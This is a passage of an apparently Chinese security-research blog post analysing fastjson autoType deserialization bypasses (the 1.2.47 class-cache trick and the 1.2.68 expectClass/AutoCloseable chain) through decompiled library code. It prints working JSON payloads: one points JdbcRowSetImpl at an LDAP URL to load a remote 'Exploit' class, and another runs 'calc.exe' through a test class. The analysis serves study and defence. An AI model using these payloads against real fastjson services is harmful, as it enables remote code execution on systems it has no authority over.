            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>h1 <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span>className<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>className<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> 1099511628211L <span class="token operator">==</span> 655701488918567152L<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"autoType is not support. "</span> <span class="token operator">+</span> typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                <span class="token keyword">long</span> h3 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">-</span>3750763034362895579L <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span>className<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> 1099511628211L <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span>className<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> 1099511628211L <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span>className<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">*</span> 1099511628211L<span class="token punctuation">;</span>
                <span class="token keyword">long</span> hash<span class="token punctuation">;</span>
                <span class="token keyword">int</span> i<span class="token punctuation">;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>autoTypeSupport <span class="token operator">||</span> expectClass <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    hash <span class="token operator">=</span> h3<span class="token punctuation">;</span>

                    <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> className<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        hash <span class="token operator">^=</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span>className<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
                        hash <span class="token operator">*=</span> 1099511628211L<span class="token punctuation">;</span>
                        <span class="token keyword">if</span> <span class="token punctuation">(</span>Arrays<span class="token punctuation">.</span><span class="token function">binarySearch</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>acceptHashCodes<span class="token punctuation">,</span> hash<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                            clazz <span class="token operator">=</span> TypeUtils<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>typeName<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>defaultClassLoader<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                            <span class="token keyword">if</span> <span class="token punctuation">(</span>clazz <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                                <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>
                            <span class="token punctuation">}</span>
                        <span class="token punctuation">}</span>

                        <span class="token keyword">if</span> <span class="token punctuation">(</span>Arrays<span class="token punctuation">.</span><span class="token function">binarySearch</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>denyHashCodes<span class="token punctuation">,</span> hash<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> TypeUtils<span class="token punctuation">.</span><span class="token function">getClassFromMapping</span><span class="token punctuation">(</span>typeName<span class="token punctuation">)</span> <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"autoType is not support. "</span> <span class="token operator">+</span> typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token punctuation">}</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span>

                <span class="token keyword">if</span> <span class="token punctuation">(</span>clazz <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    clazz <span class="token operator">=</span> TypeUtils<span class="token punctuation">.</span><span class="token function">getClassFromMapping</span><span class="token punctuation">(</span>typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>

                <span class="token keyword">if</span> <span class="token punctuation">(</span>clazz <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    clazz <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>deserializers<span class="token punctuation">.</span><span class="token function">findClass</span><span class="token punctuation">(</span>typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>

                <span class="token keyword">if</span> <span class="token punctuation">(</span>clazz <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span>expectClass <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> clazz <span class="token operator">!=</span> HashMap<span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>expectClass<span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"type not match. "</span> <span class="token operator">+</span> typeName <span class="token operator">+</span> <span class="token string">" -> "</span> <span class="token operator">+</span> expectClass<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                        <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">this</span><span class="token punctuation">.</span>autoTypeSupport<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        hash <span class="token operator">=</span> h3<span class="token punctuation">;</span>

                        <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> className<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                            <span class="token keyword">char</span> c <span class="token operator">=</span> className<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>
                            hash <span class="token operator">^=</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span>c<span class="token punctuation">;</span>
                            hash <span class="token operator">*=</span> 1099511628211L<span class="token punctuation">;</span>
                            <span class="token keyword">if</span> <span class="token punctuation">(</span>Arrays<span class="token punctuation">.</span><span class="token function">binarySearch</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>denyHashCodes<span class="token punctuation">,</span> hash<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"autoType is not support. "</span> <span class="token operator">+</span> typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>
                            <span class="token punctuation">}</span>

                            <span class="token keyword">if</span> <span class="token punctuation">(</span>Arrays<span class="token punctuation">.</span><span class="token function">binarySearch</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>acceptHashCodes<span class="token punctuation">,</span> hash<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                                <span class="token keyword">if</span> <span class="token punctuation">(</span>clazz <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                                    clazz <span class="token operator">=</span> TypeUtils<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>typeName<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>defaultClassLoader<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                                <span class="token punctuation">}</span>

                                <span class="token keyword">if</span> <span class="token punctuation">(</span>expectClass <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> expectClass<span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                                    <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"type not match. "</span> <span class="token operator">+</span> typeName <span class="token operator">+</span> <span class="token string">" -> "</span> <span class="token operator">+</span> expectClass<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                                <span class="token punctuation">}</span>

                                <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>
                            <span class="token punctuation">}</span>
                        <span class="token punctuation">}</span>
                    <span class="token punctuation">}</span>

                    <span class="token keyword">if</span> <span class="token punctuation">(</span>clazz <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        clazz <span class="token operator">=</span> TypeUtils<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>typeName<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>defaultClassLoader<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>

                    <span class="token keyword">if</span> <span class="token punctuation">(</span>clazz <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        <span class="token keyword">if</span> <span class="token punctuation">(</span>TypeUtils<span class="token punctuation">.</span><span class="token function">getAnnotation</span><span class="token punctuation">(</span>clazz<span class="token punctuation">,</span> JSONType<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span> <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                            <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>
                        <span class="token punctuation">}</span>

                        <span class="token keyword">if</span> <span class="token punctuation">(</span>ClassLoader<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span> <span class="token operator">||</span> DataSource<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"autoType is not support. "</span> <span class="token operator">+</span> typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token punctuation">}</span>

                        <span class="token keyword">if</span> <span class="token punctuation">(</span>expectClass <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                            <span class="token keyword">if</span> <span class="token punctuation">(</span>expectClass<span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>clazz<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                                <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>
                            <span class="token punctuation">}</span>

                            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"type not match. "</span> <span class="token operator">+</span> typeName <span class="token operator">+</span> <span class="token string">" -> "</span> <span class="token operator">+</span> expectClass<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token punctuation">}</span>

                        JavaBeanInfo beanInfo <span class="token operator">=</span> JavaBeanInfo<span class="token punctuation">.</span><span class="token function">build</span><span class="token punctuation">(</span>clazz<span class="token punctuation">,</span> clazz<span class="token punctuation">,</span> <span class="token keyword">this</span><span class="token punctuation">.</span>propertyNamingStrategy<span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token keyword">if</span> <span class="token punctuation">(</span>beanInfo<span class="token punctuation">.</span>creatorConstructor <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>autoTypeSupport<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"autoType is not support. "</span> <span class="token operator">+</span> typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>
                        <span class="token punctuation">}</span>
                    <span class="token punctuation">}</span>

                    <span class="token keyword">int</span> mask <span class="token operator">=</span> Feature<span class="token punctuation">.</span>SupportAutoType<span class="token punctuation">.</span>mask<span class="token punctuation">;</span>
                    <span class="token keyword">boolean</span> autoTypeSupport <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>autoTypeSupport <span class="token operator">||</span> <span class="token punctuation">(</span>features <span class="token operator">&amp;</span> mask<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span> <span class="token operator">||</span> <span class="token punctuation">(</span>JSON<span class="token punctuation">.</span>DEFAULT_PARSER_FEATURE <span class="token operator">&amp;</span> mask<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">;</span>
                    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>autoTypeSupport<span class="token punctuation">)</span> <span class="token punctuation">{</span>
                        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"autoType is not support. "</span> <span class="token operator">+</span> typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>
                    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
                        <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>
                    <span class="token punctuation">}</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">JSONException</span><span class="token punctuation">(</span><span class="token string">"autoType is not support. "</span> <span class="token operator">+</span> typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
</code></pre>
<p>这回的利用点就在第一次黑白名单过去后，从缓存Map中对class的加载，所以实际的利用需要autotype关闭，在这个情况下，能把黑名单都给过掉</p>
<p>payload如下</p>
<pre class=" language-json"><code class="language-json"><span class="token punctuation">{</span>
    <span class="token property">"a"</span><span class="token operator">:</span><span class="token punctuation">{</span>
        <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"java.lang.Class"</span><span class="token punctuation">,</span>
        <span class="token property">"val"</span><span class="token operator">:</span> <span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span>
    <span class="token punctuation">}</span><span class="token punctuation">,</span>
    <span class="token property">"b"</span><span class="token operator">:</span><span class="token punctuation">{</span>
        <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span><span class="token punctuation">,</span>
        <span class="token property">"dataSourceName"</span><span class="token operator">:</span><span class="token string">"ldap://localhost:1389/Exploit"</span><span class="token punctuation">,</span>
        <span class="token property">"autoCommit"</span><span class="token operator">:</span><span class="token boolean">true</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>因为解析是按顺序过来的，所以一开始进checkAutoType函数的是java.lang.Class，由于这个类属于基础类，所以可以直接在<code>clazz = this.deserializers.findClass(typeName);</code>中进行加载，this.deserializers在初始化的时候往里面塞了一堆基本类，这些基本类在没有autotype的情况下也能正常反序列化，而java.lang.Class就赫然在列。获取到Class类后返回到DefaultJSONParser中的parseObject，进行反序列化，进365行的<code>obj = deserializer.deserialze(this, clazz, fieldName);</code>，在这个函数中对传入类进行了判断，对于Class类，执行loadClass操作</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">if</span> <span class="token punctuation">(</span>clazz <span class="token operator">==</span> Class<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> TypeUtils<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>strVal<span class="token punctuation">,</span> parser<span class="token punctuation">.</span><span class="token function">getConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDefaultClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>而这个loadClass进重载的loadClass，额外设置一个cache为true的参数，最后来了这么一句</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">if</span> <span class="token punctuation">(</span>contextClassLoader <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> contextClassLoader <span class="token operator">!=</span> classLoader<span class="token punctuation">)</span><span class="token punctuation">{</span>
    clazz <span class="token operator">=</span> contextClassLoader<span class="token punctuation">.</span><span class="token function">loadClass</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>cache<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        mappings<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>className<span class="token punctuation">,</span> clazz<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">return</span> clazz<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>这个map就是TypeUtils的map，也就是checkAutoType前面的这句</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">if</span> <span class="token punctuation">(</span>clazz <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    clazz <span class="token operator">=</span> TypeUtils<span class="token punctuation">.</span><span class="token function">getClassFromMapping</span><span class="token punctuation">(</span>typeName<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>这里把class中value对应的类加入了这个map，接下来执行到<code>com.sun.rowset.JdbcRowSetImpl</code>类的时候，这个类已经在map里了，就能被直接加载并反序列化</p>
<p>如果开了autotype的话，反而会因为进入autotype的黑名单检测而挂掉，无法完成绕过</p>
<p>map理论上应该是用来给以前加载过的类进行一个缓存，这样子下次再遇到的时候就可以加速加载</p>
<h3 id="lt-x3D-1-2-68超级漏洞"><a href="#lt-x3D-1-2-68超级漏洞" class="headerlink" title="&lt;&#x3D;1.2.68超级漏洞"></a>&lt;&#x3D;1.2.68超级漏洞</h3><p>一开始因为我太过垃圾，直接以为1.2.48之后无敌防御了，现在才知道，到1.2.68为止还是有一个全新的超级漏洞，以及这个洞也有一两年的历史了。。。</p>
<p>学习一下，还是看checkAutoType，和48的在整体逻辑上差别不是很大，加了一个safemode，开启safemode之后就直接关掉了反序列化这个功能<br>然后还加了一个expectClassFlag，这么初始化的，就是对曾经的expectClass多套了一层过滤</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">boolean</span> expectClassFlag<span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>expectClass <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    expectClassFlag <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>expectClass <span class="token operator">!=</span> Object<span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token operator">&amp;&amp;</span> expectClass <span class="token operator">!=</span> Serializable<span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token operator">&amp;&amp;</span> expectClass <span class="token operator">!=</span> Cloneable<span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token operator">&amp;&amp;</span> expectClass <span class="token operator">!=</span> Closeable<span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token operator">&amp;&amp;</span> expectClass <span class="token operator">!=</span> EventListener<span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token operator">&amp;&amp;</span> expectClass <span class="token operator">!=</span> Iterable<span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token operator">&amp;&amp;</span> expectClass <span class="token operator">!=</span> Collection<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    expectClassFlag <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    expectClassFlag <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre>
<p>之前调试的时候也看到了这个expectClass的变量值，如果expectClass存在的话，会在最后autotype没开后的load处加载的类和expectClass进行对比，如果是expectClass的子类的话，就可以返回该class（如果class在黑名单里面，那开局检查黑名单的时候就直接挂了）。</p>
<p>rmb神仙在博客中提到，在反序列化指定类的field时，可以直接无视autotype和黑白名单以及safemode<br>比如这个例子</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>z33<span class="token punctuation">.</span>test<span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestThread</span> <span class="token punctuation">{</span>
    java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>Thread thread<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setThread</span><span class="token punctuation">(</span>java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>Thread test<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>thread <span class="token operator">=</span> test<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>这样<code>JSON.parseObject(serializedStr, TestThread.class);</code>是可以直接反序列化<code>&#123;&quot;thread&quot;: &#123;&quot;@type&quot;:&quot;java.lang.Thread&quot;&#125;&#125;</code>生成一个TestThread对象的，这个过程根本不需要进入checkAutoType进行检测<br>而写一个SubThread类继承Thread时，就会进入checkAutoType函数，不过会因为其是expectClass Thread类的子类而通过，黑白名单只检测传入类是否在黑名单内，而不检测expectClass是否属于黑名单类（不过rmb神仙也说了，一般来说不会有人把危险类作为某个类的参数吧，并且还要指定反序列化的是这个带有危险类field的类，并且这个时候不传@type也能直接反序列化thread类的。。）</p>
<h4 id="expectClass的意义"><a href="#expectClass的意义" class="headerlink" title="expectClass的意义"></a>expectClass的意义</h4><p>设计思路是当你load一个类A时，如果这个类A是在白名单里或允许load的，那么再反序列化它的时候就需要把它的成员变量也给实例化出来，那如果他的参数不在白名单里就凉了，所以就可以设置一个expectClass，将允许其<strong>及其子类</strong>的反序列化，以实现基本的运行逻辑</p>
<p>简单翻了翻代码，在对DefaultJSONPraser中做语义分析时调用的checkAutoType中传入的expectClass都是null，只有当checkAutoType中返回了一个class后进入到JavaBeanDeserializer.deserialze方法后，解析成员变量时会对checkAutoType传expectClass</p>
<p>那么攻击思路也就比较清晰了，找到允许反序列化类中的成员变量是一个比较祖宗的类，比如java.lang.Object，那一切都是它的子类，就能直接通过expectClass加载到我们需要的类</p>
<p>所以fastjson也做了基本的防护，在后续的版本添加了这个expectClassFlag，要求expectClass不能是如上这些祖宗类</p>
<pre class=" language-java"><code class="language-java">expectClass <span class="token operator">!=</span> Object<span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token operator">&amp;&amp;</span> 
expectClass <span class="token operator">!=</span> Serializable<span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token operator">&amp;&amp;</span> 
expectClass <span class="token operator">!=</span> Cloneable<span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token operator">&amp;&amp;</span> 
expectClass <span class="token operator">!=</span> Closeable<span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token operator">&amp;&amp;</span> 
expectClass <span class="token operator">!=</span> EventListener<span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token operator">&amp;&amp;</span> 
expectClass <span class="token operator">!=</span> Iterable<span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token operator">&amp;&amp;</span> 
expectClass <span class="token operator">!=</span> Collection<span class="token punctuation">.</span><span class="token keyword">class</span>
</code></pre>
<p>看一下网传的payload<br><code>&#123;&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;:&quot;org.z33.test.MyAutoCloseAble&quot;, &quot;cmd&quot;:&quot;calc.exe&quot;&#125;</code><br>这里的MyAutoCloseAble是一个实现了AutoCloseable接口的在构造函数里面直接rce的测试类，可能<code>AutoCloseable</code>这种接口太过祖宗，所以能直接在缓存map中找到，从而被加载。因此，就会将AutoCloseable作为expectClass进行其成员变量的加载，而MyAutoCloseAble实现了AutoCloseable，能够通过checkAutoType，在反序列化时执行构造函数完成rce</p>
<h4 id="关于expectClass的一点思考"><a href="#关于expectClass的一点思考" class="headerlink" title="关于expectClass的一点思考"></a>关于expectClass的一点思考</h4><p>因为调试比较老版本的fastjson时根本没有在checkAutoType中看见这个expectClassFlag，还以为这个是在47-68中的某个版本加上去的，如果是这样子的话，那么这段版本中就应该存在可以直接反序列化Object这类祖宗类子类的漏洞<br>先写一个拿Object做filed的类</p>
<pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> org<span class="token punctuation">.</span>z33<span class="token punctuation">.</span>test<span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestObject</span> <span class="token punctuation">{</span>
    Object object<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setObject</span><span class="token punctuation">(</span>Object object<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>object <span class="token operator">=</span> object<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre>
<p>再随便反序列化一个类<br><code>&#123;&quot;object&quot;:&#123;&quot;@type&quot;: &quot;org.z33.test.SubThread&quot;&#125;&#125;</code><br>然后我直接调试了一下47，发现在一开始整个解析流程就不对了，再进了一个ASMxx的代码段之后没法跟进看代码，在这个里面就走上了完全不同的道路。。。。<br>但是就目前我的浅陋测试代码而言，似乎在加载Object对象时不会简单的让人如愿，但是为什么呢，我也试不出来，<strong>有人知道务必教教我呜呜</strong></p>
<p>对于更高版本的防护，当然是在68中添加了额外的expectClass黑名单，包括了之前说到的<code>java.lang.AutoCloseable</code>以及<code>java.lang.Readable java.lang.Runnable</code></p>
<p>实际利用的话，就要找AutoCloseable这个类的子类都有哪些能利用了，在今年的blackhat USA上有一系列的披露，从mysql jdbc连数据库的反序列化RCE，到common io的任意文件读，还有一些结合第三方库的任意文件写<br><a href="https://mp.weixin.qq.com/s/BRBcRtsg2PDGeSCbHKc0fg">关于blackhat2021披露的fastjson1.2.68链</a></p>
<p>也许对于目标环境，如果其本身指定了反序列化类的话，看看其field有没有可利用的类然后进行现场挖掘？</p>
<h2 id="垃圾漏洞复现"><a href="#垃圾漏洞复现" class="headerlink" title="垃圾漏洞复现"></a>垃圾漏洞复现</h2><p>就抄几个最常见的payload</p>
<h3 id="java-net-Inet6Address"><a href="#java-net-Inet6Address" class="headerlink" title="java.net.Inet6Address"></a>java.net.Inet6Address</h3><p>经典URLDNS探测是否存在漏洞以及是否能够出网，并且由于这个类的超级普适性，在任何版本下都是可以直接利用的，大概原因可能是FastJson初始化的时候直接塞到了缓存map或者deserialize中？</p>
